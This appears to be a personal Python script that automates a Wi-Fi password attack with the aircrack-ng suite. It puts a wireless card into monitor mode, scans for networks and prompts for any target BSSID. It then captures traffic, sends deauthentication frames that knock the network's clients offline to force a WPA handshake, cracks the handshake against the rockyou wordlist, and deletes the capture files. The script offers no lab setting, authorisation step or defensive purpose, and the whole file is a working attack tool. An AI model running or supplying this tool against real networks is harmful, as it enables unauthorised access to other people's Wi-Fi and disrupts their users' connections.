import subprocess
import time
import os

# Configuration
INTERFACE = "wlan0"  # Change this to your interface name
MONITOR_MODE = INTERFACE + "mon"
CAPTURE_FILE = "capture"
WORDLIST = "/home/torqueace/WifiHack/Cracker/rockyou.txt"  # Change this to your wordlist path

def run_command(command):
    """Runs a shell command and returns the output."""
    return subprocess.run(command, shell=True)

def set_monitor_mode():
    """Puts the wireless card into monitor mode."""
    print("[*] Killing conflicting processes...")
    run_command("sudo airmon-ng check kill")
    print("[*] Setting interface to monitor mode...")
    run_command(f"sudo airmon-ng start {INTERFACE}")

def scan_networks():
    """Scans for nearby Wi-Fi networks."""
    print("[*] Scanning for networks... Press Ctrl+C to stop.")
    try:
        run_command(f"sudo airodump-ng {MONITOR_MODE}")
    except KeyboardInterrupt:
        print("\n[+] Scan stopped.")
    
def select_target():
    """Prompts the user to select a target network."""
    bssid = input("[?] Enter target BSSID: ")
    channel = input("[?] Enter target Channel: ")
    return bssid, channel

def capture_handshake(bssid, channel):
    """Captures handshake for the selected target."""
    print(f"[*] Capturing handshake on BSSID: {bssid}, Channel: {channel}")
    try:
        run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} --write {CAPTURE_FILE} {MONITOR_MODE}")
    except KeyboardInterrupt:
        print("\n[+] Stopped packet capture.")
    
def deauth_attack(bssid):
    """Performs a deauth attack to capture handshake."""
    print("[*] Performing deauth attack...")
    run_command(f"sudo aireplay-ng --deauth 20 -a {bssid} {MONITOR_MODE}")

def crack_password(bssid):
    """Attempts to crack the captured handshake using a wordlist."""
    print("[*] Attempting to crack the password...")
    run_command(f"sudo aircrack-ng -w {WORDLIST} -b {bssid} {CAPTURE_FILE}-01.cap")

def cleanup():
    """Stops monitor mode, restarts networking services, and removes capture files."""
    print("[*] Cleaning up...")
    run_command(f"sudo airmon-ng stop {MONITOR_MODE}")
    run_command("sudo service NetworkManager restart")
    
    # Remove all capture files in the current directory
    print("[*] Removing capture files...")
    for file in os.listdir():
        if file.startswith(CAPTURE_FILE):
            os.remove(file)
            print(f"[-] Deleted: {file}")
    print("[+] Cleanup complete.")

def main():
    """Main function to run the script workflow."""
    try:
        set_monitor_mode()
        scan_networks()
        bssid, channel = select_target()
        capture_handshake(bssid, channel)
        deauth_attack(bssid)
        crack_password(bssid)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        cleanup()

if __name__ == "__main__":
    main()

